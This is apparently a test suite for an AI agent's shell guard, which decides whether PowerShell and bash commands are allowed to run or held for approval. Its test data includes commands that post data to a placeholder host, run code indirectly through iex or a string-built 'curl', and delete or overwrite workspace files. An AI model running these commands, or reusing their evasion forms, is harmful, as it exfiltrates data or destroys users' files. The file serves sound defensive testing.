import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { existsSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { test } from 'node:test';
import { parseConfig } from '../src/config/store.ts';
import { openDatabase } from '../src/db/database.ts';
import { MIGRATIONS } from '../src/db/migrations.ts';
import { resolvePaths } from '../src/paths.ts';
import { PendingStore } from '../src/pending/store.ts';
import { ApprovalBroker } from '../src/tools/approvals.ts';
import { shellRun } from '../src/tools/builtin/shell.ts';
import { outboundOf, type OutboundEnv } from '../src/tools/hooks/outbound.ts';
import { checkShellCommand } from '../src/tools/hooks/shell-guard.ts';
import { runToolCall } from '../src/tools/pipeline.ts';
import { buildPolicy, defaultWorkspace } from '../src/tools/policy.ts';
import { ToolRegistry } from '../src/tools/registry.ts';
import type { ToolContext } from '../src/tools/types.ts';
import { tempDir, testConfig } from './helpers.ts';

type Shell = 'bash' | 'powershell' | 'pwsh';

const ENV: OutboundEnv = { isTracked: () => false, isClean: () => false, isCreated: () => false, pushUrls: () => undefined, pushRemote: () => undefined };

function verdictOf(command: string, shell: Shell) {
  const cwd = process.cwd();
  const checked = checkShellCommand(command, cwd, { shell, windows: shell !== 'bash', outsideRoots: 'ask', policy: { roots: [{ path: cwd, mode: 'write' }], deny: [] } });
  const out = outboundOf({ tool: 'shell', statements: checked.statements }, ENV);
  return { decision: checked.decision, reasonKeys: checked.reasonKeys, outbound: out ? `${out.kind}:${(out.keys ?? []).join(',')}` : 'none' };
}

const EVERYDAY: ReadonlyArray<readonly [string, Shell]> = [
  ['foreach ($f in Get-ChildItem) { $f.Name }', 'powershell'],
  ['foreach ($f in Get-ChildItem) { $f.Name }', 'pwsh'],
  ['foreach ($f in Get-ChildItem) { $f.FullName }', 'powershell'],
  ['foreach ($f in Get-ChildItem) { $f }', 'powershell'],
  ['foreach ($f in Get-ChildItem) { $f.Name.ToUpper() }', 'powershell'],
  ["foreach ($f in Get-ChildItem) { $f.Name -replace 'a', 'b' }", 'powershell'],
  ['foreach ($f in Get-ChildItem) { $f | Out-Null }', 'powershell'],
  ["powershell -NoProfile -Command 'foreach ($f in Get-ChildItem) { $f.Name }'", 'bash'],
  ['Get-ChildItem | ForEach-Object { $_.FullName }', 'powershell'],
  ['$files = Get-ChildItem; $files.Count', 'powershell'],
];

test('L180: foreach の頭の変数（$f.Name・$f.FullName などの読むだけの本体）は、プログラムの呼び出しとして送るに数えない', () => {
  const wrong = EVERYDAY.flatMap(([command, shell]) => {
    const got = verdictOf(command, shell).outbound;
    return got === 'none' ? [] : [`${shell}: ${command} -> ${got}`];
  });
  assert.deepEqual(wrong, []);
});

const SENDS: ReadonlyArray<readonly [string, Shell, 'allow' | 'ask']> = [
  ['& $C -d x https://e.com', 'powershell', 'ask'],
  ['. $x', 'powershell', 'ask'],
  ['Invoke-Expression $x', 'powershell', 'ask'],
  ['iex $x', 'powershell', 'ask'],
  ['$f = "curl"; & $f -d x https://e.com', 'powershell', 'ask'],
  ['foreach ($f in Get-ChildItem) { & $f }', 'powershell', 'ask'],
  ['foreach ($f in Get-ChildItem) { & $f -d x https://e.com }', 'powershell', 'ask'],
  ['foreach ($f in Get-ChildItem) { . $f }', 'powershell', 'ask'],
  ['foreach ($f in Get-ChildItem) { Invoke-Expression $f }', 'powershell', 'ask'],
  ['foreach ($f in Get-ChildItem) { & ("cu" + "rl") -d x https://e.com }', 'powershell', 'ask'],
  ['try { foreach ($f in Get-ChildItem) { & $f } } catch {}', 'powershell', 'ask'],
  ["powershell -NoProfile -Command 'foreach ($f in Get-ChildItem) { & $f }'", 'bash', 'ask'],
  ['f=curl; $f -d x https://e.com', 'bash', 'ask'],
  ['for f in a b; do $f; done', 'bash', 'ask'],
  ['foreach ($f in Get-ChildItem) { $f.Invoke() }', 'powershell', 'ask'],
  ['foreach ($f in Get-ChildItem) { $f.Delete() }', 'powershell', 'ask'],
  ['foreach ($f in Get-ChildItem) { $f.Directory.Delete() }', 'powershell', 'ask'],
  ['foreach ($f in Get-ChildItem) { $f.Replace("victim.txt", $null) }', 'powershell', 'allow'],
  ['foreach ($f in Get-ChildItem) { $f.Replace("victim.txt", $null) }', 'pwsh', 'allow'],
  ['foreach ($f in Get-ChildItem) { $f.Name.Replace("a", "b") }', 'powershell', 'allow'],
  ["foreach ($f in Get-ChildItem) { $f.Replace('v', $null) | Out-Null }", 'powershell', 'allow'],
  ["foreach ($f in Get-ChildItem) { \"$($f.Replace('v', $null))\" }", 'powershell', 'allow'],
  ['foreach ($f in Get-ChildItem) { "$($f.Delete())" }', 'powershell', 'ask'],
  ["foreach ($f in Get-ChildItem) { $f.('Delete')() }", 'powershell', 'ask'],
  ['foreach ($f in Get-ChildItem) { $f.$m() }', 'powershell', 'ask'],
  ['foreach ($f in Get-ChildItem) { & { $f.Delete() } }', 'powershell', 'ask'],
  ['foreach ($f in Get-ChildItem) { Start-Job { $f.Delete() } }', 'powershell', 'ask'],
  ['foreach ($f in Get-ChildItem) { [IO.File]::Delete($f.FullName) }', 'powershell', 'ask'],
  ['foreach ($f in Get-ChildItem) { $f.IsReadOnly = $true }', 'powershell', 'allow'],
  ['foreach ($f in Get-ChildItem) { $f.IsReadOnly = $true }', 'pwsh', 'allow'],
  ['foreach ($f in Get-ChildItem) { $f.Attributes = "Hidden" }', 'powershell', 'allow'],
  ['foreach ($f in Get-ChildItem) { $f.LastWriteTime = Get-Date }', 'powershell', 'allow'],
  ['foreach ($f in Get-ChildItem) { $f.Length++ }', 'powershell', 'ask'],
  ['foreach ($f in Get-ChildItem) { $n = $f.Length }', 'powershell', 'allow'],
  ['foreach ($f in $(curl https://e.com)) { $f }', 'powershell', 'allow'],
  ['foreach ($f in (Invoke-WebRequest https://e.com)) { $f }', 'powershell', 'ask'],
  ['foreach ($f in Get-ChildItem) { curl https://e.com }', 'powershell', 'allow'],
  ['foreach ($f in Get-ChildItem) { Invoke-WebRequest https://e.com }', 'powershell', 'ask'],
  ['foreach ($f in Get-ChildItem) { Get-Content $f.FullName }', 'powershell', 'ask'],
  ['foreach ($f in Get-ChildItem) { $f > out.txt }', 'powershell', 'ask'],
  ['foreach ($f in Get-ChildItem) { $f.Name; $f.Length }', 'powershell', 'allow'],
  ['foreach ($f in $files) { $f.Count }', 'powershell', 'allow'],
  ['foreach ($f in 1,2,3) { $f.Count }', 'powershell', 'allow'],
  ['foreach ($d in Get-ChildItem) { foreach ($f in Get-ChildItem) { $f.Name }; $d.Delete() }', 'powershell', 'ask'],
  ["powershell -NoProfile -Command 'foreach ($f in Get-ChildItem) { $f.Replace(\"v\", $null) }'", 'bash', 'ask'],
];

test('L180 の対照: 変数の中身を動かす形・メソッドの呼び出し・メンバーへの代入・ネットワークの集まり・読むだけと言い切れない本体は、origin/main と同じに送るのまま（守りの判定も同じ）', () => {
  const wrong = SENDS.flatMap(([command, shell, decision]) => {
    const got = verdictOf(command, shell);
    return got.outbound === 'send:send.unknown_command' && got.decision === decision ? [] : [`${shell}: ${command} -> ${got.outbound} / ${got.decision} (want send:send.unknown_command / ${decision})`];
  });
  assert.deepEqual(wrong, []);
});

test('L180 の対照: ループの外の $x.Invoke() は前から送るでなく、確かめ（shape.method）のまま。ループの中の $f.Invoke() は送る', () => {
  const bare = verdictOf('$x.Invoke()', 'powershell');
  assert.equal(bare.decision, 'ask');
  assert.ok(bare.reasonKeys.includes('shape.method'), bare.reasonKeys.join(','));
  for (const command of ['foreach ($f in Get-ChildItem) { $f.Invoke() }', 'foreach ($f in Get-ChildItem) { $f.Delete() }']) {
    const got = verdictOf(command, 'powershell');
    assert.equal(got.outbound, 'send:send.unknown_command', command);
    assert.equal(got.decision, 'ask', command);
    assert.ok(got.reasonKeys.includes('shape.method'), `${command}: ${got.reasonKeys.join(',')}`);
  }
});

test('L180: 変数の名前だけの文でも、リダイレクトで書く形（$f > out.txt）の確かめは残る', () => {
  const got = verdictOf('foreach ($f in Get-ChildItem) { $f > out.txt }', 'powershell');
  assert.equal(got.decision, 'ask');
  assert.ok(got.reasonKeys.includes('list.ps_write'), got.reasonKeys.join(','));
});

const psAvailable = ['powershell', 'pwsh'].some(name => spawnSync(name, ['-NoProfile', '-Command', 'exit 0'], { windowsHide: true }).status === 0);
const psName = ['powershell', 'pwsh'].find(name => spawnSync(name, ['-NoProfile', '-Command', 'exit 0'], { windowsHide: true }).status === 0);

function rig(t: { after: (fn: () => void | Promise<void>) => void }) {
  const paths = resolvePaths(tempDir(t));
  mkdirSync(paths.workspace, { recursive: true });
  const raw = testConfig();
  raw.tools.roots = [{ path: 'workspace', mode: 'write' }];
  raw.tools.shell.shell = psName === 'pwsh' ? 'pwsh' : 'powershell';
  const config = parseConfig(raw);
  const db = openDatabase(':memory:', MIGRATIONS);
  t.after(() => db.close());
  const approvals = new ApprovalBroker(db);
  const registry = new ToolRegistry().register(shellRun);
  const pending = new PendingStore(db, { tools: registry, dataDir: paths.data });
  const policy = buildPolicy(config, paths);
  const ctx: ToolContext = {
    runId: 'r1', conversationId: 'c1', kind: 'chat', signal: new AbortController().signal, config, paths, policy,
    workspace: defaultWorkspace(policy, paths), taint: { tainted: false, sources: [] }, log: () => undefined,
  };
  const call = (command: string) => runToolCall({ id: `call-${Math.random()}`, name: 'shell_run', arguments: { command } }, ctx, {
    registry, approvals, pending, db, emit: () => undefined, lastUserRequest: () => 'list the files', autoClassify: async () => '{"decision":"ask","reason":"not sure"}',
  } as never);
  return { ctx, call, waiting: () => pending.list({ status: 'waiting' }) };
}

test('L180（本物の PowerShell）: foreach ($f in Get-ChildItem) { $f.Name } は Pending に積まれず、そのまま動いてファイル名が出る', { skip: !psAvailable && 'PowerShell が無い' }, async t => {
  const r = rig(t);
  writeFileSync(join(r.ctx.workspace, 'a.txt'), 'x');
  const out = await r.call('foreach ($f in Get-ChildItem) { $f.Name }');
  assert.equal(out.decision, 'allow', out.output.content);
  assert.equal(out.decidedBy, 'builtin');
  assert.match(out.output.content, /a\.txt/u);
  assert.equal(r.waiting().length, 0);
});

test('L180（本物の PowerShell）の対照: foreach ($f in Get-ChildItem) { & $f -d x https://e.com } は動かさず、送るとして Pending に積む', { skip: !psAvailable && 'PowerShell が無い' }, async t => {
  const r = rig(t);
  const out = await r.call('foreach ($f in Get-ChildItem) { & $f -d x https://e.com }');
  assert.equal(out.decidedBy, 'pending', out.output.content);
  assert.match(out.output.content, /It has NOT run/u);
  assert.deepEqual(r.waiting().map(row => row.kind), ['send']);
});

test('L180（本物の PowerShell）の対照: foreach ($f in Get-ChildItem) { $f.Replace("victim.txt", $null) } は動かさず、送るとして Pending に積む（動けば a.txt が消え victim.txt が書き換わる）', { skip: !psAvailable && 'PowerShell が無い' }, async t => {
  const r = rig(t);
  writeFileSync(join(r.ctx.workspace, 'a.txt'), 'A');
  writeFileSync(join(r.ctx.workspace, 'victim.txt'), 'V');
  const out = await r.call('foreach ($f in Get-ChildItem) { $f.Replace("victim.txt", $null) }');
  assert.equal(out.decidedBy, 'pending', out.output.content);
  assert.match(out.output.content, /It has NOT run/u);
  assert.deepEqual(r.waiting().map(row => row.kind), ['send']);
  assert.equal(existsSync(join(r.ctx.workspace, 'a.txt')), true);
  assert.equal(readFileSync(join(r.ctx.workspace, 'victim.txt'), 'utf8'), 'V');
});
